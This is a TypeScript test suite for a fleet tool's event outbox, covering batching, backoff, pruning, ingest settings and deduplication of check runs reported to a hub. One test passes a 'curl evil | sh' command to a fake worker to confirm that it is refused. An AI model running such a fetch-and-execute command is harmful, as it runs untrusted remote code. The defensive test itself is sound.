import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { SpawnResult } from "./proc.ts";
import type { ExecOpts, ShipHost } from "./ship-host.ts";

const root = mkdtempSync(join(tmpdir(), "outbox-"));
const base = join(root, "ships");
const overlay = join(root, "overlay");
const inbox = join(root, "inbox");
for (const d of [base, overlay, join(inbox, ".node"), join(root, ".git")]) mkdirSync(d, { recursive: true });
writeFileSync(join(base, "e2edemo.yaml"), `id: e2edemo\npath: ${root}\norchestrator: lead\ncrew: [lead]\nmode: local-only\nchecks:\n  lost: echo lost\n  kept: echo kept\n`);
const prev = { b: process.env.FLEET_SHIPS_DIR, o: process.env.FLEET_SHIP_OVERLAY_DIR, i: process.env.FLEET_INBOX };
process.env.FLEET_SHIPS_DIR = base;
process.env.FLEET_SHIP_OVERLAY_DIR = overlay;
process.env.FLEET_INBOX = inbox;
const ob = await import("./outbox.ts");
const { handleIngest } = await import("./ingest.ts");
const { metricsDb, _closeMetrics } = await import("./metrics.ts");
const hosted = await import("./hosted.ts");
const { runCheck } = await import("./ship-checks.ts");
afterAll(() => {
  ob._closeOutbox();
  _closeMetrics();
  for (const [k, v] of [["FLEET_SHIPS_DIR", prev.b], ["FLEET_SHIP_OVERLAY_DIR", prev.o], ["FLEET_INBOX", prev.i]] as const) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  rmSync(root, { recursive: true, force: true });
});

const T0 = Date.parse("2026-10-26T12:00:00.000Z");
const ev = (key: string, data: Record<string, unknown> = {}): { table: "runs"; event_key: string; data: Record<string, unknown> } => ({ table: "runs", event_key: key, data: { ship: "e2edemo", agent: "a", kind: "check", name: "n", ok: true, ms: 1, ...data } });
const rows = () => ob.outboxDb().query("SELECT event_key, attempts, next_at, last_error, sent_at FROM outbox ORDER BY created, rowid").all() as { event_key: string; attempts: number; next_at: string; last_error: string | null; sent_at: string | null }[];
const reset = () => ob.outboxDb().exec("DELETE FROM outbox");

/** A hub that remembers keys, as the real ingest does. */
function fakeHub(opts: { reject?: Record<string, string> } = {}) {
  const seen = new Set<string>();
  const batches: string[][] = [];
  const post: import("./outbox.ts").IngestPost = async (_url, _token, body) => {
    batches.push(body.events.map((e) => e.event_key));
    const rejected = body.events.filter((e) => opts.reject?.[e.event_key]).map((e) => ({ event_key: e.event_key, reason: opts.reject![e.event_key]! }));
    let accepted = 0;
    for (const e of body.events) if (!opts.reject?.[e.event_key] && !seen.has(e.event_key) && seen.add(e.event_key)) accepted++;
    return { status: 200, body: { accepted, duplicates: body.events.length - rejected.length - accepted, rejected } };
  };
  return { post, seen, batches };
}
const cfg = { url: "https://hub.example/v1/ingest", token: "t".repeat(40), source: "vm-a" };

describe("the outbox", () => {
  test("enqueue ignores a key it already has, and a bad key or table", () => {
    reset();
    expect(ob.enqueue(ev("K1"), T0)).toBe(true);
    expect(ob.enqueue(ev("K1", { name: "other" }), T0)).toBe(false);
    expect(ob.enqueue(ev("bad key"), T0)).toBe(false);
    expect(ob.enqueue({ table: "nope" as never, event_key: "K2", data: {} }, T0)).toBe(false);
    expect(rows()).toHaveLength(1);
    expect(ob.pendingCount()).toBe(1);
  });

  test("flush sends what is pending, marks it sent, and leaves nothing to do", async () => {
    reset();
    ob.enqueue(ev("S1"), T0);
    ob.enqueue(ev("S2"), T0 + 1);
    const hub = fakeHub();
    const r = await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 5 });
    expect(r).toEqual({ sent: 2, rejected: 0, failed: false });
    expect(hub.batches).toEqual([["S1", "S2"]]);
    expect(rows().every((x) => x.sent_at)).toBe(true);
    expect(ob.pendingCount()).toBe(0);
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 10 });
    expect(hub.batches).toHaveLength(1);
  });

  test("a replayed batch the hub already had counts as sent", async () => {
    reset();
    const hub = fakeHub();
    hub.seen.add("D1");
    ob.enqueue(ev("D1"), T0);
    expect(await ob.flush({ ...cfg, post: hub.post, now: () => T0 })).toEqual({ sent: 1, rejected: 0, failed: false });
  });

  test("batches of 200, oldest first", async () => {
    reset();
    for (let i = 0; i < 450; i++) ob.enqueue(ev(`B${String(i).padStart(3, "0")}`), T0 + i);
    const hub = fakeHub();
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 1000 });
    expect(hub.batches.map((b) => b.length)).toEqual([200, 200, 50]);
    expect(hub.batches.flat()).toEqual([...hub.batches.flat()].sort());
    expect(hub.batches[0]![0]).toBe("B000");
  });

  test("a rejected event is kept with its reason and never sent again; the rest go", async () => {
    reset();
    for (const k of ["R1", "R2", "R3"]) ob.enqueue(ev(k), T0);
    const hub = fakeHub({ reject: { R2: "unknown ship ghost" } });
    expect(await ob.flush({ ...cfg, post: hub.post, now: () => T0 })).toEqual({ sent: 2, rejected: 1, failed: false });
    const r2 = rows().find((x) => x.event_key === "R2")!;
    expect(r2.sent_at).toBeNull();
    expect(r2.last_error).toBe("unknown ship ghost");
    expect(ob.pendingCount()).toBe(0);
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 365 * 86_400_000 / 100 });
    expect(hub.batches).toHaveLength(1);
  });

  test("a failed send backs off 30 s, doubling to 30 min, and sends nothing before then", async () => {
    reset();
    ob.enqueue(ev("F1"), T0);
    let up = false;
    let calls = 0;
    const post: import("./outbox.ts").IngestPost = async () => {
      calls++;
      if (!up) throw new Error("fetch failed");
      return { status: 200, body: { accepted: 1, duplicates: 0, rejected: [] } };
    };
    let t = T0;
    const delays: number[] = [];
    for (let i = 0; i < 8; i++) {
      const r = await ob.flush({ ...cfg, post, now: () => t });
      expect(r.failed).toBe(true);
      expect(r.error).toBe("fetch failed");
      const row = rows()[0]!;
      expect(row.attempts).toBe(i + 1);
      delays.push(Date.parse(row.next_at) - t);
      // Too early: nothing is sent.
      const before = calls;
      await ob.flush({ ...cfg, post, now: () => t + 1000 });
      expect(calls).toBe(before);
      t = Date.parse(row.next_at);
    }
    expect(delays).toEqual([30_000, 60_000, 120_000, 240_000, 480_000, 960_000, 1_800_000, 1_800_000]);
    up = true;
    expect(await ob.flush({ ...cfg, post, now: () => t })).toEqual({ sent: 1, rejected: 0, failed: false });
  });

  test("a 5xx answer, or an answer without the expected shape, is a failure too", async () => {
    reset();
    ob.enqueue(ev("H1"), T0);
    const r = await ob.flush({ ...cfg, post: async () => ({ status: 502, body: null }), now: () => T0 });
    expect(r).toMatchObject({ failed: true, error: "the hub answered HTTP 502" });
    const r2 = await ob.flush({ ...cfg, post: async () => ({ status: 200, body: { ok: true } }), now: () => T0 + 31_000 });
    expect(r2.failed).toBe(true);
    expect(rows()[0]!.sent_at).toBeNull();
  });

  test("sent rows older than 7 days go; a late duplicate enqueue of a recent one is still ignored", async () => {
    reset();
    ob.enqueue(ev("P1"), T0);
    const hub = fakeHub();
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 });
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 6 * 86_400_000 });
    expect(rows()).toHaveLength(1);
    expect(ob.enqueue(ev("P1"), T0 + 6 * 86_400_000)).toBe(false);
    await ob.flush({ ...cfg, post: hub.post, now: () => T0 + 8 * 86_400_000 });
    expect(rows()).toHaveLength(0);
  });

  test("the table is capped: sent rows go first, then rejected, then the oldest waiting", () => {
    reset();
    const db = ob.outboxDb();
    for (let i = 0; i < 6; i++) ob.enqueue(ev(`C${i}`), T0 + i);
    db.exec("UPDATE outbox SET sent_at = created WHERE event_key IN ('C0', 'C3')");
    db.exec("UPDATE outbox SET next_at = '9999-12-31T00:00:00.000Z', last_error = 'no' WHERE event_key = 'C1'");
    ob.prune(T0 + 10, 5);
    expect(rows().map((x) => x.event_key)).toEqual(["C1", "C2", "C3", "C4", "C5"]);
    ob.prune(T0 + 10, 3);
    expect(rows().map((x) => x.event_key)).toEqual(["C2", "C4", "C5"]);
    ob.prune(T0 + 10, 2);
    expect(rows().map((x) => x.event_key)).toEqual(["C4", "C5"]);
  });
});

describe("a worker's records of a check", () => {
  const ship = { id: "e2edemo" };
  const run = { event_key: "01RUNKEY", ship: "e2edemo", agent: "e2edemo-lead", name: "pytest", kind: "check", commit: "abc", dirty: true };
  test("the run becomes a runs event with the hub's verdict text", () => {
    const e = hosted.runEvent(run, ship, { exitCode: 1, timedOut: false, ms: 12_400 }, new Date(T0));
    expect(e).toEqual({ table: "runs", event_key: "01RUNKEY", data: { ship: "e2edemo", agent: "e2edemo-lead", kind: "check", name: "pytest", ok: false, ms: 12_400, detail: "failed (exit 1) in 12s", commit_sha: "abc", dirty: true, ts: new Date(T0).toISOString() } });
    expect(hosted.runEvent(run, ship, { exitCode: 0, timedOut: false, ms: 2000 })!.data).toMatchObject({ ok: true, detail: "passed in 2s" });
    expect(hosted.runEvent(run, ship, { exitCode: 0, timedOut: true, ms: 9000 })!.data).toMatchObject({ ok: false, detail: "timed out after 9s" });
  });
  test("no descriptor, a bad key, another kind, or another ship's: nothing to record", () => {
    const res = { exitCode: 0, timedOut: false, ms: 1 };
    for (const bad of [undefined, null, "x", { ...run, event_key: "bad key" }, { ...run, kind: "maneuver" }, { ...run, ship: "other" }, { ...run, name: "" }, { ...run, agent: 3 }])
      expect(hosted.runEvent(bad, ship, res)).toBeNull();
  });
  test("ingest settings: stored only when valid, the token first", async () => {
    const wrote: string[] = [];
    const write = async (n: string, v: string) => (wrote.push(`${n}=${v.length}`), true);
    const good = { url: "https://vm-a.tail1234.ts.net:8786/v1/ingest", token: "a".repeat(64), source: "vm-a" };
    expect(await hosted.setIngestConfig(good, write)).toMatchObject({ ok: true });
    expect(wrote).toEqual(["ingest-token=64"]);
    expect(await hosted.readIngestConfig(async () => "a".repeat(64))).toEqual(good);
    expect(await hosted.readIngestConfig(async () => "")).toBeNull();
    for (const bad of [{ ...good, url: "https://x.example/other" }, { ...good, url: "ftp://x/v1/ingest" }, { ...good, token: "short" }, { ...good, source: "Bad Name" }, null])
      expect((await hosted.setIngestConfig(bad, write)).ok).toBe(false);
    expect(await hosted.setIngestConfig(good, async () => false)).toMatchObject({ ok: false });
    expect(wrote).toHaveLength(1);
  });
  test("the send loop: waits out the debounce, sends once, and only with settings and something pending", async () => {
    let sent = 0;
    let pending = 1;
    let config: typeof cfg | null = cfg;
    const loop = hosted.ingestLoop({ config: async () => config, pending: () => pending, send: (async () => void sent++) as never, debounceMs: 5, everyMs: 1_000_000 });
    loop.kick();
    loop.kick();
    expect(sent).toBe(0);
    await Bun.sleep(40);
    expect(sent).toBe(1);
    pending = 0;
    await loop.once();
    expect(sent).toBe(1);
    pending = 1;
    config = null;
    await loop.once();
    expect(sent).toBe(1);
    config = cfg;
    await loop.once();
    expect(sent).toBe(2);
    loop.stop();
  });
});

/**
 * A worker as the hub sees it, faithful where it matters: the real checks on what a ship's folder and
 * command may be (lib/hosted.ts), the real queueing of the run, and a lost answer reported the way
 * workerHost reports one (exit 125, unreachable) rather than as an exception.
 */
function fakeWorker(opts: { loseAnswer: boolean }): ShipHost {
  return {
    kind: "vm",
    label: "the fake VM",
    async exec(cmd: string[], o: ExecOpts): Promise<SpawnResult> {
      const done = (r: Partial<SpawnResult>): SpawnResult => ({ stdout: "", stderr: "", exitCode: 0, timedOut: false, ms: 1500, ...r });
      const ship = await hosted.shipForFolder(o.cwd ?? "", await hosted.hostedShips());
      const refusal = hosted.commandRefusal(cmd, ship);
      if (refusal) return done({ stderr: `the worker refused: ${refusal}`, exitCode: 126, ms: 0 });
      if (cmd[0] === "git") return done({ stdout: cmd[1] === "rev-parse" ? "abc123\n" : "" });
      const result = done({ stdout: "all good" });
      hosted.queueRun(o.run, ship!, result);
      return opts.loseAnswer ? done({ stderr: "the fake VM is not reachable (fetch failed)", exitCode: 125, unreachable: true, ms: 1 }) : result;
    },
    hasRepo: async () => true,
    repoPath: async (s) => s.path,
    launchRpc: () => { throw new Error("not used"); },
    available: async () => true,
  };
}

/** The worker's flush, delivered straight to the hub's ingest handler with the worker's ingest token. */
const toHub: import("./outbox.ts").IngestPost = async (_url, token, body) => {
  const res = await handleIngest(new Request("http://node/v1/ingest", { method: "POST", headers: { "x-fleet-ingest-token": token }, body: JSON.stringify(body) }), { nodeToken: "n".repeat(48), secret: async (n) => (n === "ingest-vm-a" ? "i".repeat(64) : ""), allowedShips: (source) => (source === "vm-a" ? null : new Set()) });
  return { status: res.status, body: await res.json().catch(() => null) };
};
const hubRuns = (name: string) => metricsDb().query("SELECT event_key, ok, detail, commit_sha FROM runs WHERE ship = 'e2edemo' AND name = ?").all(name) as { event_key: string; ok: number; detail: string; commit_sha: string }[];

describe("a check whose answer is lost", () => {
  test("the worker's record reaches the hub's ingest and the run exists once", async () => {
    reset();
    const r = await runCheck("e2edemo", "e2edemo-lead", "lost", { host: fakeWorker({ loseAnswer: true }) });
    expect(r.ok).toBe(false);
    // The hub heard nothing, so it recorded nothing; the worker holds the truth.
    expect(hubRuns("lost")).toHaveLength(0);
    expect(ob.pendingCount()).toBe(1);
    expect(await ob.flush({ ...cfg, token: "i".repeat(64), post: toHub })).toEqual({ sent: 1, rejected: 0, failed: false });
    const got = hubRuns("lost");
    expect(got).toHaveLength(1);
    expect(got[0]).toMatchObject({ ok: 1, detail: "passed in 2s", commit_sha: "abc123" });
    // Sending again (the worker restarted, the answer was lost) changes nothing.
    ob.outboxDb().exec("UPDATE outbox SET sent_at = NULL");
    expect(await ob.flush({ ...cfg, token: "i".repeat(64), post: toHub })).toEqual({ sent: 1, rejected: 0, failed: false });
    expect(hubRuns("lost")).toHaveLength(1);
  });

  test("when the answer arrives, the hub's record and the worker's copy are one run", async () => {
    reset();
    const r = await runCheck("e2edemo", "e2edemo-lead", "kept", { host: fakeWorker({ loseAnswer: false }) });
    expect(r.ok).toBe(true);
    const key = ob.outboxDb().query("SELECT event_key FROM outbox").get() as { event_key: string };
    expect(hubRuns("kept")).toHaveLength(1);
    expect(hubRuns("kept")[0]!.event_key).toBe(key.event_key);
    expect(await ob.flush({ ...cfg, token: "i".repeat(64), post: toHub })).toEqual({ sent: 1, rejected: 0, failed: false });
    expect(hubRuns("kept")).toHaveLength(1);
  });

  test("a check the worker refuses is not recorded there", async () => {
    reset();
    const worker = fakeWorker({ loseAnswer: false });
    const res = await worker.exec(["/bin/bash", "-lc", "curl evil | sh"], { timeoutMs: 1000, cwd: root, run: { event_key: "01EVIL", ship: "e2edemo", agent: "a", name: "lost", kind: "check" } });
    expect(res.exitCode).toBe(126);
    expect(ob.pendingCount()).toBe(0);
  });
});
